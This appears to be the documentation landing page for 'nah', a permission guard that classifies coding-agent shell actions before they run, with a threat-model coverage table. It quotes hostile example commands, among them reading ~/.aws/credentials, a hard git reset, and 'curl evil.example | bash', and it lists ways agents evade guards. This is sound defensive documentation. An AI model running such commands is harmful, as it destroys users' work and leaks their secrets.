<style>.md-content h1 { display: none; }</style>

<p align="center">
  <img src="assets/logo.png" alt="nah" width="280" class="invertible">
</p>

<p align="center">
  <strong>Action-aware permissions for coding agents.</strong><br>
  A deterministic safety guard that keeps you in the flow.
</p>

---

## The problem

Trusting commands by name is the wrong abstraction.

`git` can check status, or it can rewrite history.

`git status` — normal.<br>
`git reset --hard HEAD~20` — destroys work.

`rm` can clean a build artifact, or it can break your shell.

`rm -rf __pycache__` — cleanup.<br>
`rm ~/.bashrc` — breaks your shell.

`cat` can read source code, or it can leak cloud keys.

`cat ./src/app.py` — normal.<br>
`cat ~/.aws/credentials` — leaks credentials.

Even when you curate permissions, agents can route around command names through
shells, wrappers, scripts, and MCP tools. Allow/deny lists are a fool's errand.
You either approve too much, block useful work, or train yourself to click
through prompts. That is why developers drift into yolo mode.

nah classifies what the action actually does before it runs. Safe work keeps
moving. Ambiguous actions ask. Dangerous actions stop before they do damage.
Deterministic, milliseconds, zero required dependencies, pure Python, sane
defaults out of the box.

## How it works

`nah` classifies every guarded action by what it actually does using contextual
rules that run in milliseconds.

- **Taxonomy** maps actions to safety types like `git_history_rewrite`,
  `network_outbound`, `filesystem_delete`, and `lang_exec`.
- **Context** checks project root, trusted paths, sensitive files, command
  composition, target runtime, network hosts, and database targets.
- **Custom classifiers** let you teach nah your own commands and tools without
  maintaining fragile deny lists.
- **Intent and LLM review** can help with eligible ambiguous cases where the
  runtime exposes useful context. Deterministic blocks cannot be relaxed.

Every decision is logged and inspectable. Works out of the box, configure it how
you want it.

## Quick install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

Then connect the runtime you want to protect: [`nah run claude`](runtimes/claude-code.md)
for Claude Code, [`nah run codex`](runtimes/codex.md) for local Codex sessions,
or [`nah install bash`](runtimes/terminal-guard.md) /
[`nah install zsh`](runtimes/terminal-guard.md) for commands you type yourself.

The Claude Code plugin is still available for Claude-only installs without the
`nah` CLI. See [Claude Code](runtimes/claude-code.md#plugin-only-path).

**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.

## Threat model and runtime coverage

nah's pytest threat-model audit currently tracks **1,807 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | ---: | --- |
| Sensitive file access | 254 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 234 | <code>curl &#124; bash</code>, downloaded scripts, command substitution, heredocs |
| Git history damage | 222 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 213 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 153 | package installs, global installs, external-source package actions |
| Secret leaks | 92 | private keys, tokens, secret-looking writes, script/content leaks |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| Secret exfiltration | 88 | sensitive reads flowing into network commands or credential searches |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Guard tampering | 67 | edits to nah hooks, config, runtime settings, robustness paths |
| Project boundary escapes | 46 | reads/writes outside the project root or trusted paths |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

Run it yourself:

```bash
nah audit-threat-model --format summary
```

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| [Claude Code](runtimes/claude-code.md) | Bash, file, search, notebook, and MCP tool calls before execution |
| [Codex](runtimes/codex.md) | Local interactive Bash, MCP, and `apply_patch` permission requests |
| [Your shell](runtimes/terminal-guard.md) | Commands you type yourself in guarded bash/zsh sessions |

The audit is strongest around shell command safety, and also covers file, path,
content, search, MCP, and guard self-protection. See [How it works](how-it-works.md)
for detailed tool coverage and classifier behavior, and [Threat model](threat-model.md)
for audited coverage.

---

[Install](install.md) | [Runtimes](runtimes/claude-code.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Threat model](threat-model.md) | [Privacy](privacy.md)
